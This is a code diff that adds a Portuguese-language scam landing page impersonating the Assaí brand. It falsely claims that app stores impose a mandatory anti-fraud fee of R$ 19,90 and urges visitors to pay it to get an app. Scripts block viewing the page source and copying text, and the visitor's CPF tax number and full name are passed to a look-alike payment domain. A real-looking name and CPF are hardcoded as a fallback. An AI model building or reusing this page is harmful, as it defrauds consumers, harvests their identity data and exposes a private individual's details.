@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+   <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1289289589600537');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1289289589600537&ev=PageView&noscript=1"
+/></noscript>
+
+<!-- End Meta Pixel Code -->
+    <script>
+        localStorage.setItem("upsell", "up6");
+    </script>
+  
+    <meta charset="UTF-8">
+    <link href="npm/bootstrap%405.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
+
+    <!-- Bootstrap Bundle JS (inclui Popper.js) -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
+        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+
+    <style>
+        .modal {
+          z-index: 999999 !important;
+        }
+      
+        .modal-backdrop {
+          z-index: 999998 !important;
+        }
+      </style>
+    <style>
+    .header {
+        background-color: #1E3A80;
+        padding: 15px 0;
+        text-align: center;
+        font-size: 1.5rem;
+        font-weight: bold;
+        border-bottom: solid 3px  #ee4d2d;
+    }
+    .main-content {
+        max-width: 450px;
+        background-color: white;
+        text-align: center;
+        padding: 2rem 2rem 1rem 2rem;
+        border-radius: 10px;
+        box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+        margin: 0 auto;
+    }
+    .main-content h2 {
+        margin-bottom: 20px;
+    }
+    .btn-custom {
+        color: white;
+        border: none;
+        width: 100%;
+        margin-bottom: 10px;
+        background: #1E3A80;
+        font-weight: 500;
+        border-radius: 1rem;
+        padding: .75rem 3rem;
+        letter-spacing: .3px;
+        line-height: 1.15;
+    }
+    .btn-custom:hover{
+        color: black !important;
+        background-color: #1E3A80 !important;
+        transform: scale(1.02) !important;
+    }
+    
+    .footer {
+        background-color: #1E3A80;
+        border-top: solid 1px #e6dddd;
+        color: white;
+        text-align: center;
+        width: 100%;
+        bottom: 0;
+        grid-area: footer;
+        border-bottom: solid 3px #1E3A80;
+        padding: 2rem 0.5rem;
+        position: relative;
+        margin-top: 50px;
+    }
+    
+    #conclusao {
+        display: none; /* Esconde o elemento por padrão */
+    }
+    
+    #conclusao h4 {
+        color: green; /* Define a cor do texto */
+        font-weight: bold; /* Define o texto em negrito */
+    }
+    
+    .char {
+        border-top: solid px #00adca;
+        background-color: #00adca;
+        padding: 2px !important;
+    }/* End custom CSS */
+    </style>
+    
+
+<script>
+if (document.addEventListener) {
+    document.addEventListener("keydown", bloquearSource);
+} else { //Versões antigas do IE
+    document.attachEvent("onkeydown", bloquearSource);
+}
+
+function bloquearSource(e) {
+    e = e || window.event;
+
+    var code = e.which || e.keyCode;
+
+    if (
+        e.ctrlKey &&
+        (code == 83 || code == 85) //83 = S, 85 = U
+    ) {
+        if (e.preventDefault) {
+            e.preventDefault();
+        } else {
+            e.returnValue = false;
+        }
+
+        return false;
+    }
+}
+</script>
+<style>
+/*desabilita a seleção no body*/
+body {
+    -webkit-touch-callout: none; /* iOS Safari */
+      -webkit-user-select: none; /* Chrome/Safari/Opera */
+       -khtml-user-select: none; /* Konqueror */
+         -moz-user-select: none; /* Firefox */
+          -ms-user-select: none; /* Internet Explorer/Edge */
+              user-select: none;
+}
+
+/*habilita a seleção nos campos editaveis*/
+input, textarea {
+    -webkit-touch-callout: initial; /* iOS Safari */
+      -webkit-user-select: text; /* Chrome/Safari/Opera */
+       -khtml-user-select: text; /* Konqueror */
+         -moz-user-select: text; /* Firefox */
+          -ms-user-select: text; /* Internet Explorer/Edge */
+              user-select: text;
+}
+
+/*habilita a seleção nos campos com o atributo contenteditable*/
+[contenteditable=true] {
+    -webkit-touch-callout: initial; /* iOS Safari */
+      -webkit-user-select: all; /* Chrome/Safari/Opera */
+       -khtml-user-select: all; /* Konqueror */
+         -moz-user-select: all; /* Firefox */
+          -ms-user-select: all; /* Internet Explorer/Edge */
+              user-select: all;
+}
+</style>
+
+<script>
+if (document.addEventListener) {
+    document.addEventListener("contextmenu", function(e) {
+        e.preventDefault();
+        return false;
+    });
+} else { //Versões antigas do IE
+    document.attachEvent("oncontextmenu", function(e) {
+        e = e || window.event;
+        e.returnValue = false;
+        return false;
+    });
+}
+</script>
+
+<script>
+    window.pixelId = "6770a52cb49a5a7efea968bf";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+
+    function applyUtmToLinks() {
+            // Captura os parâmetros UTM da URL atual
+            const utmParams = new URLSearchParams(window.location.search).toString();
+
+            if (utmParams) {
+                document.querySelectorAll("a").forEach(link => {
+                    // Adiciona UTM aos links internos
+                    if (link.href && link.href.includes(window.location.origin)) {
+                        const newUrl = new URL(link.href);
+                        newUrl.search += (newUrl.search ? '&' : '') + utmParams;
+                        link.href = newUrl.toString();
+                    }
+                });
+            }
+        }
+
+        // Executa a função após o carregamento da página
+        window.addEventListener("load", applyUtmToLinks);
+  </script>
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+
+</head>
+
+<body>
+<div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">   
+   <div class="header">
+        <img decoding="async" style="width: 130px;" src="download/logo.svg" alt="Imagem Centralizada" data-lazy-src="https://d9hhrg4mnvzow.cloudfront.net/lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000.png" data-ll-status="loaded" class="entered lazyloaded"><noscript><img decoding="async" style="width: 120px;" src="lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000.png" alt="Imagem Centralizada"></noscript>
+    </div>
+ 
+
+    <div style="grid-area: content; padding: 0 1rem;">
+        <div style="margin-top: 40px;" class="main-content text-center">
+        <h1 style="color: #089b08;">Perfeito! Vamos lá...</h1>
+        <p>No ano de 2024 as lojas de aplicativos <strong>(PlayStore e AppStore)</strong> criaram uma tarifa obrigatória para toda instituição financeira que possui atuação no Brasil, que é nosso caso. Esta tarifa tem o objetivo de inibir possíveis fraudes.</p>
+        <p>Nós do <strong>Assaí</strong> não achamos justo ser cobrado este valor de nossos clientes, por isso todo valor pago nesta tarifa será reembolsado na sua <strong>Conta Digital no Aplicativo</strong>.</p>
+
+        <div class="card p-3 my-4">
+
+            <p style="font-weight: 600;">Não se preocupe, este valor estará disponível na sua conta digital, assim que você baixar seu aplicativo.</p>
+            <p>O link para baixar o App será liberado imediatamente após o pagamento.</p>
+ 
+            <div class="text-center">
+                
+            </div>
+            
+        </div>
+
+        <h3 class="text-pink"><strong>R$ 19,90</strong></h3>
+          <button id="gerar-pagamento" type="button" onclick="redirectCheckout();" class="btn btn-custom rounded-pill w-100 mt-3">
+            <span id="text-button-payment">Quero baixar meu aplicativo</span>
+
+            <div id="spinner" class="spinner-border text-light d-none" role="status">
+                <span class="sr-only"></span>
+            </div>
+        </button>
+        
+
+        </div>
+    </div>    
+
+      
+  </div>
+
+  <script>
+    function redirectCheckout() {
+        localStorage.setItem('type', 'up5');
+
+        // Busca os dados do CPF do localStorage (vindos da pasta 4)
+        const dadosCPF = JSON.parse(localStorage.getItem('dadosCPF')) || { 
+            nomeCompleto: "MICHAEL FRANCA DOS SANTOS", 
+            cpf: "33311996801"
+        };
+
+        // Constrói a URL do Assaí com os parâmetros
+        const baseUrl = "https://pay.assaipagamentos.space/NDr8gmKA5lRZBmj";
+        const documentParam = dadosCPF.cpf || "33311996801";
+        const nameParam = encodeURIComponent(dadosCPF.nomeCompleto || "MICHAEL FRANCA DOS SANTOS");
+        
+        const finalUrl = `${baseUrl}?document=${documentParam}&name=${nameParam}`;
+        
+        // Redireciona para a URL do Assaí
+        window.location.href = finalUrl;
+    }
+</script>
+
+</body>
+
+
+</html>
